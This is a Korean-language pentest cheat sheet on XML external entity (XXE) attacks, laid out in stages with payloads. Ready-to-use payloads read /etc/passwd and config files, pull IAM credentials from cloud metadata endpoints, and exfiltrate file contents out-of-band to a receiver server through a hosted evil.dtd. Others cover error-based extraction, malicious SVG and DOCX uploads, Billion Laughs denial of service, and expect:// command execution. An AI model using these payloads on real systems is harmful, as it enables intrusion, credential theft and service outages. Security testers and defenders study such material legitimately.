# 11_XXE

XML 파서가 DOCTYPE 안의 외부 엔티티를 검증 없이 해석할 때 발생한다. 로컬 파일 읽기, 내부망 SSRF, 경우에 따라 RCE까지 이어진다.

---

## 탐지 지점

```
- Content-Type: application/xml, text/xml 로 명시된 요청
- Content-Type이 text/plain이나 application/json인데 바디가 XML인 경우
- SOAP/SAML 엔드포인트 (/soap/, /saml/, /sso/, /ws/)
- SVG, DOCX/XLSX/PPTX, ODT 업로드 (모두 XML 기반 포맷)
- 문서 변환/레이아웃 서비스 (이력서 파서, PDF 생성기, 전자서명 도구)
```

---

## 1단계: 기본 탐지

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY test "xxetest_value"> ]>
<root>&test;</root>
```

응답에 "xxetest_value"가 그대로 나오면 이 파서가 엔티티를 해석한다는 것이 확인된다.

---

## 2단계: 로컬 파일 읽기

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

응답 필드 안에 파일 내용이 그대로 들어온다. 디렉토리 요청은 보통 에러가 나지만, 일부 파서(Java Xerces 등)는 파일명 목록을 에러에 노출하기도 함.

---

## 3단계: SSRF 연계 (내부망/클라우드 메타데이터)

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance">
<!ENTITY xxe SYSTEM "http://<내부IP>:<포트>/admin">
```

---

## 4단계: Blind/OOB XXE

### 탐지 (Collaborator/interactsh로 상호작용 확인)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY % ext SYSTEM "http://<수신서버>/x"> %ext; ]>
<r></r>
```

### 파일 내용 외부로 유출 (외부 DTD 호스팅 필요)

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://<수신서버>/evil.dtd">
<data>&send;</data>
```

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://<수신서버>/?%file;'>">
%all;
```

파일 내용이 GET 파라미터로 수신서버로 그대로 날아간다. 파일에 특수문자/개행이 있으면 URL이 깨질 수 있으니 일부만 전송될 수 있음 — 이때는 PHP wrapper로 base64 인코딩해서 전송.

---

## 5단계: OOB가 막혀있을 때 — 로컬 DTD 재정의로 에러 기반 추출

외부 연결이 다 막혀있으면, 서버에 이미 있는 로컬 DTD 파일(docbookx.dtd, cim20.dtd 등)을 재정의해서 에러 메시지 안에 파일 내용을 노출시킸다.

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;>">
  %eval;
  %error;
'>
%local_dtd;
]>
<message>x</message>
```

OS별 존재하는 로컬 DTD 경로 목록은 HackTricks/dtd-finder 레포지토리에 정리되어 있음.

---

## 파일 업로드를 통한 XXE (SVG / DOCX / XLSX)

### SVG

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&xxe;</text></svg>
```

아바타/이미지 렌더링 기능이 SVG를 지원하면, 렌더링된 결과물 안에 파일 내용이 텍스트로 박혀서 나옵.

### DOCX/XLSX (ZIP 기반 XML 묶음)

```bash
unzip target.docx -d out/
# out/word/document.xml 상단에 DOCTYPE + ENTITY 삽입, 본문에 &xxe; 참조 추가
cd out && zip -r ../malicious.docx .
# 재압축 시 zip -u 사용 (7z는 시그니쳐가 깨져서 파일 인식 실패할 수 있음)
```

`oxml_xxe` 도구가 이 과정을 자동화해줌.

---

## 파라미터 엔티티 vs 일반 엔티티

```xml
<!ENTITY name "value">    
<!ENTITY % name "value">  
```

일반 엔티티(`&name;`)는 XML 본문 안에서 사용, 파라미터 엔티티(`%name;`)는 DTD 내부에서만 사용 가능하다. Blind/OOB 공격은 대부분 파라미터 엔티티를 쓴다 — 일반 엔티티는 본문 안에서만 참조 가능해서 응답이 안 보일 때 활용도가 제한적이다.

---

## 다른 프로토콜로 공격 범위 확장

```
file://    로컬 파일 읽기
http(s)://  SSRF, 외부/내부망 요청
ftp://      OOB 데이터 유출 (포트 하나로 전송)
jar:file:///archive.zip!/file.txt   ZIP/JAR 안 파일 접근 (Java 환경 전용)
dict://ip:port/_XXX     내부 서비스 포트 스캔/배너 확인
```

---

## 팁

- Content-Type이 XML이 아니라도 바디가 XML 형태면 무조건 시도
- 응답에 바로 안 보이면 포기하지 말고 OOB(Burp Collaborator/interactsh)로 먼저 확인
- 파일 업로드 기능(아바타, 문서 변환)이 있으면 SVG/DOCX도 반드시 XXE 후보로 간주

---

## 고난도: XInclude 공격 (DOCTYPE가 아예 막혀있을 때)

애플리케이션이 사용자 입력을 XML 문서 전체가 아니라, **기존 XML 문서 안의 한 노드 값**으로만 넣는 구조(예: `<root><data>사용자입력</data></root>` 중 `사용자입력` 자리만 통제 가능)면 DOCTYPE 자체를 선언할 위치가 없다. 이때 XInclude 네임스페이스를 이용하면 DOCTYPE 없이도 파일을 끌어올 수 있다.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

파서가 XInclude를 지원하면 DOCTYPE 선언 없이도 로컬 파일 내용이 그대로 삽입된다.

## 고난도: Billion Laughs / Quadratic Blowup (DoS)

엔티티가 서로를 재귀적으로 참조하도록 만들어서, 파서가 이를 전개하는 과정에서 메모리를 기하급수적으로 소모시켜 서비스를 마비시킨다.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!-- 계속 중첩하면 최종 전개 크기가 수 GB까지 커짐 -->
]>
<lolz>&lol4;</lolz>
```

파일 읽기가 아니라 가용성 공격(DoS)이라 실전 침투테스트에서는 스코프/승인 여부를 반드시 확인하고 시도해야 한다.

## 고난도: PHP 전용 wrapper 활용 (PHP 기반 서버일 때)

```xml
<!-- base64로 인코딩해서 특수문자 포함 파일도 안전하게 추출 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">

<!-- expect:// 는 PECL expect 확장이 설치된 극히 드문 환경에서 즉시 RCE로 이어짐 -->
<!ENTITY xxe SYSTEM "expect://id">

<!-- data:// 는 짧은 페이로드를 즉석에서 인라인으로 넣을 때 사용 -->
<!ENTITY xxe SYSTEM "data://text/plain;base64,<base64인코딩된값>">
```

참고: 이 노트의 XXE 자체는 이런 wrapper 스킴을 브라우저 JS(XHR)에서 쓸 수 없다 — 서버가 직접 XML을 파싱하는 경우(진짜 XXE)에만 유효하고, "12_SSRF_문서생성기"처럼 클라이언트 JS가 [https://app.notion.com](https://app.notion.com) 읽는 경우엔 안 통한다.

## 파서별 강화 방법 (역으로, 취약 여부 진단에 참고)

```
libxml2 (PHP)   : libxml_disable_entity_loader(true) 로 방어. 오래된 버전은 기본값이 취약
Java (기본 파서) : setFeature("http://apache.org/xml/features/disallow-doctype-decl", true) 없으면 취약
.NET             : XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit 없으면 취약
Python (lxml)    : resolve_entities=False, no_network=True 옵션 없으면 취약
```

공격 전에 서버가 어떤 언어/프레임워크인지 파악하면, 그 언어의 흔한 미설정 패턴을 먼저 노려볼 수 있다.